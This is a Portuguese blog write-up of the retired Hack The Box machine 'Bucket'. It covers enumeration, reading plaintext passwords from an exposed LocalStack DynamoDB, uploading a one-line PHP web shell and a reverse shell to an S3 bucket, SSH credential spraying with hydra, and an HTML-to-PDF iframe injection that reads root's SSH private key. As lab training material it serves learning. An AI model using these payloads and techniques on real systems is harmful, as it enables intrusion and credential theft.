---
layout: single
title: "Hackthebox write-up: Bucket"
namespace: htb-bucket
category: Writeup
tags: HackTheBox htb-medium htb-linux
date: 2021-04-24 12:00:00
header:
   teaser: https://i.imgur.com/m7oESPT.png
---

Olá pessoal!

A máquina desta semana será **Bucket**, outra máquina classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [MrR3boot](https://app.hackthebox.eu/users/13531). <!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.
{: .notice--info}

![HTB Bucket](https://i.imgur.com/Qp79TCm.png){: .align-center}

Particularmente achei essa máquina bem legal, onde tive a oportunidade de "brincar" um pouco com os serviços de armazenamento da AWS, mesmo que em uma instância local para desenvolvedores.

A sua resolução esteve bastante ligada a este serviço onde tivemos que identificar uma forma de incluir um arquivo no site publicado para obter um shell reverso, obter a flag de user com credenciais existentes no DynamoDB.

O flag de root foi obtido após abuso de uma aplicação ainda em desenvolvimento, onde utilizamos uma vulnerabilidade de LFI para obter a chave do `id_rsa` e assim obter acesso interativo com esta conta.

## Enumeração

Como de costume, iniciamos com a enumeração rápida do `nmap` para identificar os serviços publicados nesta máquina:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.212                                                                  Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap -sC -sV -Pn -oA quick 10.10.10.212
Nmap scan report for 10.10.10.212
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds
```

### 80/TCP - Serviço HTTP

Uma vez que notei um redirect para `bucket.htb`, incluí a entrada no arquivo hosts apontando para o endereço IP da máquina.

Ao acessar o site, notei que diversas imagens não foram carregadas adequadamente, as quais apontavam para `s3.bucket.htb`, vide chamada `curl` abaixo. Após incluir também esta entrada no arquivo hosts, o carregamento da página ocorreu com sucesso.

```bash
$ curl -L http://bucket.htb | grep -Eo 'href=".*"|src=".*"' | sort -u
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5344  100  5344    0     0  33822      0 --:--:-- --:--:-- --:--:-- 33822
href="#"
href="#"><i class="fab fa-facebook-square"
href="#"><i class="fab fa-instagram"
href="#"><i class="fab fa-linkedin"
href="#"><i class="fab fa-twitter"
src="http://s3.bucket.htb/adserver/images/bug.jpg" alt="Bug" height="160" width="160"
src="http://s3.bucket.htb/adserver/images/cloud.png" alt="cheer" height="160" width="160"
src="http://s3.bucket.htb/adserver/images/malware.png" alt="Malware" height="160" width="160"
```

#### `s3.bucket.htb`

Ao identificar o DNS `s3.bucket.htb` me chamou atenção para o nome, o qual faz referência ao serviço [Amazon S3](https://aws.amazon.com/s3), que provê armazenamento de arquivos no formato blob em nuvem.

Analisando o webserver da requisição para uma das URLs de imagem, notei que se utiliza de outro webserver (`hypercorn-h11`), diferente do Apache listado no Scan do NMAP para a página na URL `bucket.htb`, o que significa que temos outro serviço na máquina ou há algum tipo de proxy na requisição neste virtual host.

Para validar o que temos nesta estrutura, realizei uma enumeração utilizando o `gobuster` e encontrei dois diretórios interessantes: *health* e *shell*

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb -o gobuster-s3.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3.bucket.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/26 09:42:22 Starting gobuster
===============================================================
/health (Status: 200)
/shell (Status: 200)
Progress: 2643 / 220561 (1.20%)
```

É importante mencionar que são diretórios, pois o resultado para as chamadas em cada um dos nomes via `curl` com ou sem a barra ao final é diferente, conforme podemos ver abaixo:

```bash
$ curl -L http://s3.bucket.htb/health                                                                       
{"services": {"s3": "running", "dynamodb": "running"}}

$ curl -L http://s3.bucket.htb/health/
{"status": "running"}                                                                                                 
$ curl -L http://s3.bucket.htb/shell


$ curl -L http://s3.bucket.htb/shell/
<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/Product">
  <head>
    <title>AWS Console</title>
    <meta charset="UTF-8">

    <!-- Application -->
[...]
```

Como a última chamada (`curl -L http://s3.bucket.htb/shell/`) retornou o conteúdo de uma página HTML, refiz a requisição no navegador e notei que estava acessando à página do **DynamoDB Web Shell**.

Pesquisando um pouco pude chegar à conclusão de que estávamos utilizando um emulador de storage da AWS, possivelmente uma instancia do [Localstack](https://github.com/localstack/localstack), muito popular entre desenvolvedores.

![DynamoDB Web SHell - Bucket HTB](https://i.imgur.com/6J27Miv.png){: .align-center}

Brincando com alguns dos exemplos da página, consegui listar algumas informações da instancia (ListTables e DescribeTable), conforme abaixo, onde podemos listar algumas informações como a região do serviço (`us-east-1`) e uma tabela chamada `users` no DynamoDB, assim como o seu respectivo resource name `arn:aws:dynamodb:us-east-1:000000000000:table/users`.

![DynamoDB Web Shell - List - Bucket HTB](https://i.imgur.com/cKIzAtd.png){: .align-center}

Considerando que estamos falando de uma instância do LocalStack, descobri que é possível utilizar o [awscli](https://aws.amazon.com/cli), utilitário de linha de comando da AWS, para se conectar à esta instância local, conforme post [Local Development with AWS on LocalStack (reflectoring.io)](https://reflectoring.io/aws-localstack/).

Como o `awscli` é mais flexível para enumerar e trabalhar com os recursos do que o DynamoDB Web Shell, segui para a instalação via `apt` e sua conexão utilizando as informações obtidas no post acima citado, o qual foi executado conforme abaixo. Para as credenciais, quaisquer valores são válidos, uma vez que não se trata de uma instância real em execução na AWS.

```bash
# Install aws cli
$ sudo apt install awscli -y
[...]
$ aws configure --profile bucket.htb                                                                         
AWS Access Key ID [None]: dummy
AWS Secret Access Key [None]: dummy
Default region name [None]: us-east-1
Default output format [None]:
```

Lendo a documentação do `awscli` para o DynamoDB, executei algumas consultas simples para listar as tabelas e entradas existentes, conforme abaixo, onde pude obter alguns usuários e senhas que poderão ser úteis futuramente.

```bash
$ aws dynamodb list-tables \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb \
    --output json
{
  "TableNames": [
    "users"
  ]
}

$ aws dynamodb scan \
    --table-name users \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb \
    --output json
{
  "Items": [
    {
      "password": {
        "S": "Management@#1@#"
      },
      "username": {
        "S": "Mgmt"
      }
    },
    {
      "password": {
        "S": "Welcome123!"
      },
      "username": {
        "S": "Cloudadm"
      }
    },
    {
      "password": {
        "S": "n2vM-<_K_Q:.Aa2"
      },
      "username": {
        "S": "Sysadm"
      }
    }
  ],
  "Count": 3,
  "ScannedCount": 3,
  "ConsumedCapacity": null
}
```

Como sabemos que temos um **s3** também em execução, enumerei algumas informações sobre os containers blob existentes, onde foi encontrado o `adserver` (o que já tínhamos uma ideia por conta da URL das imagens conforme previamente enumerado) e confirmamos qual o conteúdo deste bucket.

```bash
$ aws s3 ls \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
2021-02-26 11:48:02 adserver

$ aws s3 ls s3://adserver \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
                           PRE images/
2021-02-26 11:50:04       5344 index.html

$ aws s3 ls s3://adserver/images/ \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
2021-02-26 11:52:02      37840 bug.jpg
2021-02-26 11:52:02      51485 cloud.png
2021-02-26 11:52:02      16486 malware.png
```

## Acesso inicial

Uma vez que temos acesso ao blob s3 e sabemos quais conteúdos disponíveis e como utilizá-lo, a primeira coisa a se fazer é realizar o upload de um arquivo para shell reverso. Em primeiro momento vamos validar a possibilidade de utilizar php com um webshell simples conforme abaixo:

```php
<?php system($_GET['cmd']); ?>
```

Após a criação do arquivo, realizado o upload via CLI vide comandos abaixo:

```bash
$ aws s3 cp ./exploit.php s3://adserver/ \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
upload: ./exploit.php to s3://adserver/exploit.php                

$ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserver/              
                           PRE images/
2021-02-26 11:56:28         31 exploit.php
2021-02-26 11:56:02       5344 index.html
```

Ao tentar acessá-lo alguns instantes depois, notei que o arquivo que enviei foi removido por outro processo. Para tentar contornar a questão, configurei para que a chamada de execução de comando fosse realizada assim que o upload fosse finalizado, executando o comando `id`, onde pudemos confirmar o sucesso na tarefa realizada.

```bash
$ aws s3 cp ./exploit.php s3://adserver/ \
    --endpoint-url http://s3.bucket.htb --profile bucket.htb && curl -L http://bucket.htb/exploit.php?cmd=id
upload: ./exploit.php to s3://adserver/exploit.php                
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Para um shell reverso, alterei o arquivo a ser enviado de `exploit.php` pelo [pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell) que já iniciaria a conexão reversa a um listener previamente definido, sem a necessidade de enviar parâmetros no payload, o qual tivemos sucesso após algumas tentativas.

```bash
aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php s3://adserver/ && curl -L http://bucket.htb/exploit.php
```

## User flag

Uma vez com acesso ao shell da máquina, executei o `linpeas.sh` para simplificar a enumeração, onde os seguintes itens foram identificados:

- Usuário local `roy` possui acesso à máquina e, enumerando seu diretório observado a existencia do arquivo `user.txt`, o qual não temos acesso leitura com a conta `www-data` além de uma pasta `project` a ser inspecionada.

  - Este usuário não possui nenhum processo em execução que eventualmente permita a exploração logo precisaremos obter suas credenciais de alguma forma.

- Alguns outros serviços encontram-se em execução nesta máquina, funcionando nas portas 4566, 8000 e 38443, que possivelmente venham a dar privilégios a outras atividades em um segundo momento.

  ```output
  [+] Active Ports                                                                                         
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                               
  Active Internet connections (servers and established)                                                     
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name         
  tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                        
  tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                         
  tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                         
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
  tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
  ```

- Esta máquina possui serviços de container em execução (`ctr`, `runc`), que executam provavelmente o localstack e que poderiam ser avaliados para escalação de privilégios.

- Existe um diretório `/var/www/bucket-app` que pode ser a aplicação servida em uma das portas identificadas, mas que não possuímos acesso de leitura com a conta utilizada.

Dos pontos mencionados, o que mais chamou atenção foi o possível website em execução nas portas citadas, logo iniciei por verificar as configurações ativas no Apache (`/etc/apache2/sites-enabled`) onde tínhamos o arquivo `000-default.conf` listado abaixo, mas não encontrei nada sobre a porta 38443, mas tive a informação sobre a porta 4566, que é publicada pela porta 80 e na porta 8000, que é publicado o website disponível na pasta `/var/www/bucket-app`.

```properties
<VirtualHost 127.0.0.1:8000>
    <IfModule mpm_itk_module>
        AssignUserId root root
    </IfModule>
    DocumentRoot /var/www/bucket-app
</VirtualHost>

<VirtualHost *:80>
    DocumentRoot /var/www/html
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^bucket.htb$
    RewriteRule /.* http://bucket.htb/ [R]
</VirtualHost>
<VirtualHost *:80>
    ProxyPreserveHost on
    ProxyPass / http://localhost:4566/
    ProxyPassReverse / http://localhost:4566/
    <Proxy *>
        Order deny,allow
        Allow from all
    </Proxy>
    ServerAdmin webmaster@localhost
    ServerName s3.bucket.htb

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Embora possível identificar os serviços ativos apenas a partir da máquina local, precisaremos realizar a exploração apenas via linha de comando ou precisaremos de uma conta na máquina para tunelar o acesso a partir de SSH.

Já que os websites não permitiram muitos detalhes na enumeração, decidi testar as senhas obtidas anteriormente via DynamoDB para o usuário `roy` e felizmente tivemos sucesso. Abaixo a execução do `hydra` que utilizei para automatizar  brute force na conta via SSH.

```bash
$ hydra -l roy -P passwords 10.10.10.212 -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-26 12:55:36
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://10.10.10.212:22/
[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-26 12:55:40
```

Uma vez que tínhamos agora acesso à máquina com as credenciais do usuário `roy`, coletei a flag de usuário após me conectar via SSH:

```bash
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ cat user.txt 
<redacted>
```

## Root flag

Com o acesso ao usuário `roy` pude validar o acesso aos diretórios `project`, que tem aparentemente uma estrutura de um website, além de conseguir com esta conta acessar o conteúdo da aplicação em `/var/www/bucket-app` que possui estrutura bastante similar ao encontrado na pasta `project`, o qual fiz uma cópia para análise a partir da máquina atacante.

Analisando o conteúdo de `index.php` temos um algo bem interessante: uma função escondida para que sempre que chamada POST na página `http://127.0.0.1:8000` com o parâmetro `action=get_alerts`, é feita uma consulta numa tabela `alerts` no DynamoDB em que os valores com Title `Ransonware` são incluídos em um PDF e disponibilizados na pasta `/var/www/bucket-app/files/`.

```php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
    if($_POST["action"]==="get_alerts") {
        date_default_timezone_set('America/New_York');
        $client = new DynamoDbClient([
            'profile' => 'default',
            'region'  => 'us-east-1',
            'version' => 'latest',
            'endpoint' => 'http://localhost:4566'
        ]);

        $iterator = $client->getIterator('Scan', array(
            'TableName' => 'alerts',
            'FilterExpression' => "title = :title",
            'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
        ));

        foreach ($iterator as $item) {
            $name=rand(1,10000).'.html';
            file_put_contents('files/'.$name,$item["data"]);
        }
        passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
    }
}
else
{
?>
```

Uma vez que não temos uma tabela chamada `alerts`, conforme já enumerado, precisaremos criá-la com os atributos `title` e `data`, este, por sua vez, com conteúdo HTML a ser renderizado e posteriormente salvo no formato PDF, permitindo a possível obtenção de dados sensíveis da máquina.

Para os testes iniciais, conforme documentação da AWS disponível [neste link](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html), criei um script para criação da tabela, inclusão de uma entrada e posterior chamada POST na URL em questão para gerar o arquivo PDF.

Para simplificar este processo, que está sendo feito da máquina atacante, realizados os seguintes procedimentos:

- Na máquina atacante, criado chave RSA (`ssh-keygen`) e atribuido chave pública dela ao usuário `roy` na máquina bucket para que não fosse necessário o uso de senhas durante a autenticação.
- Na máquina atacante também foi criado o tunelamento da porta local 8000/TCP, a qual foi redirecionada para a porta 8000 na máquina bucket, fazendo o serviço disponível também localmente, o que posteriormente foi possível validar acessando localmente a página conforme evidencia abaixo

```bash
ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000 
```

![Website 8000/TCP via SSH Tunnel](https://i.imgur.com/tiTjm7I.png)

Após algumas tentativas, notei que similar ao desafio encontrado durante o upload do shell reverso, os itens criados no DynamoDB também são removidos após algum tempo, logo foi necessário encadear todas as requisições para que tivéssemos tempo para executar a ação imediatamente assim que os recursos estivessem disponíveis, assim como a posterior cópia dos ativos se obtivermos sucesso na chamada.

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
aws dynamodb put-item \
    --table-name alerts \
    --item '{"title": {"S": "Ransomware"},"data": {"S": "<html><head><title>Title</title></head><body><h1>Head 1</h1><p>Content</p></body></html>"}}' \
    --return-consumed-capacity TOTAL \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
curl --data "action=get_alerts" http://localhost:8000/
```

Após algumas tentativas, seguido do desafio do tempo para cópia do arquivo para a máquina atacante, foi possível gerar e copiar o arquivo PDF com base no HTML enviado.

```bash
roy@bucket:/var/www/bucket-app/files$ ls -la
total 16
drwxr-x---+ 2 root root 4096 Feb 26 18:51 .
drwxr-x---+ 4 root root 4096 Feb 10 12:29 ..
-rw-r--r--  1 root root   88 Feb 26 18:51 7627.html
-rw-r--r--  1 root root 1870 Feb 26 18:51 result.pdf
```

![Bucket HTB - PoC](https://i.imgur.com/XLxhZ9W.png){: .align-center}

Uma vez que conseguimos renderizar o conteúdo desejado, precisamos encontrar uma forma de incluir arquivos na página renderizada e que resulta no PDF, de modo a dar continuidade na exploração.

A forma mais fácil de obter o root flag seria importar o arquivo `/root/root.txt`, porém isso não nos dá um shell reverso de fato. Seguindo o exemplo da máquina [**Passage**]({% post_url 2021-03-06-htb-passage %}), podemos buscar por um arquivo `/root/.ssh/id_rsa` e nos conectar à máquina via shell interativo, porém nosso maior problema no momento é inserir o conteúdo destes em um arquivo HTML.

Após algumas pesquisas, a forma mais simples de alcançar este objetivo sem o uso de Javascript é utilizando um **iframe**, onde as alterações, para a qual incluí a tag `<iframe src="/root/.ssh/id_rsa" seamless></iframe>` no HTML utilizado anteriormente, conforme chamadas abaixo:

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
aws dynamodb put-item \
    --table-name alerts \
    --item '{"title": {"S": "Ransomware"},"data": {"S": "<html><head><title>Title</title></head><body><h1>Head 1</h1><iframe src=\"/root/.ssh/id_rsa\" seamless></iframe></body></html>"}}' \
    --return-consumed-capacity TOTAL \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
curl --data "action=get_alerts" http://localhost:8000/    
```

Após o procedimento foi possível baixar o aquivo `/var/www/bucket-app/files/result.pdf` e, com o conteúdo presente neste arquivo, criar o arquivo `id_rsa`, o qual foi posteriormente utilizado para conectar-se à máquina via SSH e obter a shell a partir do usuário `root`.

```bash
root@bucket:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bucket:~# cat /root/root.txt
<redacted>
```

Espero que tenham gostado!

Vejo vocês novamente em breve no próximo post! :smiley: